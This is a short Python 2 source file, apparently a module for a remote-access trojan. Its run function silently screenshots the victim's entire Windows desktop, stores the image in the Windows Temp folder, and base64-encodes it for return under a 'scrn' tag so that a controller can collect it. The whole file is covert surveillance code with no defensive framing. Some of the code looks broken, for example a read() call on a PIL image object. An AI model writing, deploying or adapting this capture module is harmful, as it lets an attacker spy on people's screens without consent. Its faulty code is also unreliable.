def run(**args):
	try:
		import win32gui
		import win32ui
		import win32con
		import win32api
		import base64
		import Image
	except:
		print "Could not load the module on this host. Skipping."
		return 0, "failed"
	hdesktop = win32gui.GetDesktopWindow()
	width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
	height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
	left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
	top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
	desktop_dc = win32gui.GetWindowDC(hdesktop)
	img_dc = win32ui.CreateDCFromHandle(desktop_dc)
	mem_dc = img_dc.CreateCompatibleDC()
	screenshot = win32ui.CreateBitmap()
	screenshot.CreateCompatibleBitmap(img_dc, width, height)
	mem_dc.SelectObject(screenshot)
	mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
	screenshot.SaveBitmapFile(mem_dc, 'c:\\Windows\\Temp\\screenshot.jpeg')
	with Image.open('c:\\Windows\\Temp\\screenshot.jpeg') as imagefile:
		imagefile = imagefile.resize((800,600),Image.ANTIALIAS)
		imagefile.save('c:\\Windows\\Temp\\screenshot.jpeg',optimize = True, quality = 95)
	with Image.open('c:\\Windows\\Temp\\screenshot.jpeg') as imagefile:
		imgstring = base64.b64encode(imagefile.read())
	return imgstring, "scrn"
	
	
